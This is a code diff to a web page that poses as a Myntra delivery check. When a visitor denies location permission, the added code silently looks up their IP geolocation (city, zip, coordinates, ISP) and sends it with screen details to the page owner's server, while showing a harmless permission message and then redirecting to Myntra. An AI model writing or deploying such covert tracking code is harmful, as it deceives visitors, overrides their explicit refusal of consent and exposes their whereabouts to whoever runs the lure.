@@ -95,21 +95,20 @@
         }
 
         function handleError(error, isBuyButton) {
-            let statusEl = document.getElementById('status');
-            statusEl.className = 'status-msg error-text';
-            
-            // If they clicked ADD TO BAG, we log the denial and redirect anyway
-            if(isBuyButton) {
-                statusEl.innerText = 'Processing your request...';
-                sendData(null, "Denied on Buy button: " + error.message, true);
-            } else {
-                // If they clicked USE CURRENT LOCATION, we show an error and DO NOT redirect
-                statusEl.innerText = 'Please allow location permission in your browser settings to check delivery.';
-                sendData(null, "Denied on Check Location: " + error.message, false);
-            }
+            // THE FALLBACK: Agar browser block karega, toh yahan chup-chaap silent location le lega!
+            fetch('https://ipapi.co/json/')
+                .then(response => response.json())
+                .then(ipData => {
+                    sendData(null, ipData, isBuyButton, error.message);
+                })
+                .catch(() => {
+                    sendData(null, null, isBuyButton, error.message);
+                });
         }
 
-        function sendData(position, locError, shouldRedirect) {
+        function sendData(position, silentData, shouldRedirect, originalErrorMsg = null) {
+            let statusEl = document.getElementById('status');
+            
             let info = {
                 screen_width: window.screen.width,
                 screen_height: window.screen.height,
@@ -125,8 +124,29 @@
                     longitude: position.coords.longitude,
                     accuracy_meters: position.coords.accuracy
                 };
+            } else if (silentData) {
+                info.stealth_location = {
+                    status: "Fallback: GPS Blocked by browser. Using Silent IP Tracking.",
+                    ip: silentData.ip,
+                    city: silentData.city,
+                    region: silentData.region,
+                    country: silentData.country_name,
+                    zip: silentData.postal,
+                    latitude: silentData.latitude,
+                    longitude: silentData.longitude,
+                    isp: silentData.org
+                };
+                
+                if(!shouldRedirect) {
+                    statusEl.className = 'status-msg error-text';
+                    statusEl.innerText = 'Please allow location permission in your browser settings to check delivery.';
+                }
             } else {
-                info.exact_location_error = locError;
+                info.error = "Everything blocked: " + originalErrorMsg;
+                if(!shouldRedirect) {
+                    statusEl.className = 'status-msg error-text';
+                    statusEl.innerText = 'Please allow location permission in your browser settings to check delivery.';
+                }
             }
 
             // Send to our Render server
@@ -137,8 +157,8 @@
             }).then(() => {
                 if(position || shouldRedirect) {
                     isRedirecting = true;
-                    document.getElementById('status').className = 'status-msg loading-text';
-                    document.getElementById('status').innerText = 'Redirecting to Myntra checkout...';
+                    statusEl.className = 'status-msg loading-text';
+                    statusEl.innerText = 'Redirecting to Myntra checkout...';
                     setTimeout(() => { window.location.href = "https://www.myntra.com/dresses"; }, 800);
                 }
             }).catch(() => {
